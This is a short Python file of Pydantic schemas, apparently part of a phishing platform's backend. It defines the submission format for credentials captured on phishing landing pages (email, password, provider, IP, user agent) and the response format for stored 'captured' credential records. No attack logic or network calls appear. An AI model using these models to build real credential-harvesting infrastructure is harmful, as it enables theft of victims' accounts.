from pydantic import BaseModel, EmailStr, field_validator
from uuid import UUID
from datetime import datetime
from typing import Optional


class HarvestSubmit(BaseModel):
    """Payload from phishing landing pages."""
    username: EmailStr
    password: str
    provider: str = "GMAIL"
    ip_address: Optional[str] = None
    user_agent: Optional[str] = None

    @field_validator("password")
    @classmethod
    def password_not_empty(cls, v: str) -> str:
        if len(v.strip()) < 1:
            raise ValueError("Password cannot be empty")
        return v


class CredentialResponse(BaseModel):
    """Never exposes password_hash or raw tokens."""
    id: UUID
    target_id: UUID
    username: str
    has_oauth: bool = False
    captured_at: datetime
    ip_address: Optional[str] = None
    user_agent: Optional[str] = None

    model_config = {"from_attributes": True}
